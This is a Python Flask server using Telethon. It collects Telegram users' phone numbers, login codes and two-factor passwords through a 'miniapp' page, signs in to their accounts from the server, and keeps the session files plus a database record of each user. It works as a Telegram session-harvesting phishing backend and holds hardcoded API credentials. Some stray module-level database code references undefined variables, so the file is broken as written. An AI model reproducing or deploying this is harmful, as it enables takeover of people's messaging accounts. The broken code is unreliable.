import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError

# =========================
# CONFIG
# =========================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

# phone -> {client, hash}
pending = {}

app = Flask(__name__, template_folder="templates")

def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(coro)
    return loop, result

# =========================
# ROUTES
# =========================

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.get_json(force=True)
    phone = data.get("phone")

    if not phone:
        return jsonify({"status": "phone_required"})

    client = TelegramClient(session_path(phone), API_ID, API_HASH)

    loop, _ = run_async(client.connect())
    result = loop.run_until_complete(client.send_code_request(phone))

    pending[phone] = {
        "client": client,
        "hash": result.phone_code_hash,
        "loop": loop
    }

    return jsonify({"status": "code_sent"})

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.get_json(force=True)
    phone = data.get("phone")
    code = data.get("code")

    if phone not in pending:
        return jsonify({"status": "no_code_requested"})

    client = pending[phone]["client"]
    phone_hash = pending[phone]["hash"]
    loop = pending[phone]["loop"]

    try:
        loop.run_until_complete(
            client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
        )
    except PhoneCodeInvalidError:
        return jsonify({"status": "invalid_code"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})

    me = loop.run_until_complete(client.get_me())

    loop.run_until_complete(client.disconnect())
    loop.close()
    pending.pop(phone)

    return jsonify({
        "status": "success",
        "user_id": me.id,
        "username": me.username
    })

me = client.get_me()
user_id = me.id

from database import get_db
conn = get_db()
cur = conn.cursor()

cur.execute(
    """
    INSERT INTO authorized_users (user_id, phone)
    VALUES (%s, %s)
    ON CONFLICT (user_id) DO UPDATE
    SET phone = EXCLUDED.phone
    """,
    (user_id, phone)
)

conn.commit()
cur.close()
conn.close()


@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.get_json(force=True)
    phone = data.get("phone")
    password = data.get("password")

    if phone not in pending:
        return jsonify({"status": "no_session"})

    client = pending[phone]["client"]
    loop = pending[phone]["loop"]

    try:
        loop.run_until_complete(client.sign_in(password=password))
    except Exception:
        return jsonify({"status": "invalid_password"})

    me = loop.run_until_complete(client.get_me())

    loop.run_until_complete(client.disconnect())
    loop.close()
    pending.pop(phone)

    return jsonify({
        "status": "success",
        "user_id": me.id
    })

me = client.get_me()
user_id = me.id

conn = get_db()
cur = conn.cursor()

cur.execute(
    """
    INSERT INTO authorized_users (user_id, phone)
    VALUES (%s, %s)
    ON CONFLICT (user_id) DO UPDATE
    SET phone = EXCLUDED.phone
    """,
    (user_id, phone)
)

conn.commit()
cur.close()
conn.close()



# =========================
# RUN
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)


